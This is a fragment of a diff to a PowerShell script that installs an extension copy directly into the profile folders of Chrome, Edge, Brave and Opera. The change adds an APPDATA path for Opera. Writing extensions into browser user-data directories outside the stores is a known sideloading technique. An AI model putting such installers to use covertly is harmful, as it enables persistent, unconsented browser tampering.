@@ -932,7 +932,7 @@ function Install-ExtensionCopy {
         $total += Process-Browser 'Google\Chrome' 'chrome' @('%LOCALAPPDATA%\Google\Chrome\User Data') $ExtDir $ExtId $manifestObj
         $total += Process-Browser 'Microsoft\Edge' 'msedge' @('%LOCALAPPDATA%\Microsoft\Edge\User Data') $ExtDir $ExtId $manifestObj
         $total += Process-Browser 'BraveSoftware\Brave-Browser' 'brave' @('%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data') $ExtDir $ExtId $manifestObj
-        $total += Process-Browser 'Opera Software' 'opera' @('%LOCALAPPDATA%\Opera Software\Opera Stable') $ExtDir $ExtId $manifestObj
+        $total += Process-Browser 'Opera Software' 'opera' @('%LOCALAPPDATA%\Opera Software\Opera Stable', '%APPDATA%\Opera Software\Opera Stable') $ExtDir $ExtId $manifestObj
         return ($total -gt 0)
     } catch {
         return $false
@@ -994,7 +994,7 @@ try {
     $total += Process-Browser 'Google\Chrome' 'chrome' $chromePaths $extDir $extId $manifestObj
     $total += Process-Browser 'Microsoft\Edge' 'msedge' $edgePaths $extDir $extId $manifestObj
     $total += Process-Browser 'BraveSoftware\Brave-Browser' 'brave' $bravePaths $extDir $extId $manifestObj
-    $operaPaths = @('%LOCALAPPDATA%\Opera Software\Opera Stable')
+    $operaPaths = @('%LOCALAPPDATA%\Opera Software\Opera Stable', '%APPDATA%\Opera Software\Opera Stable')
     $total += Process-Browser 'Opera Software' 'opera' $operaPaths $extDir $extId $manifestObj
 
     Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
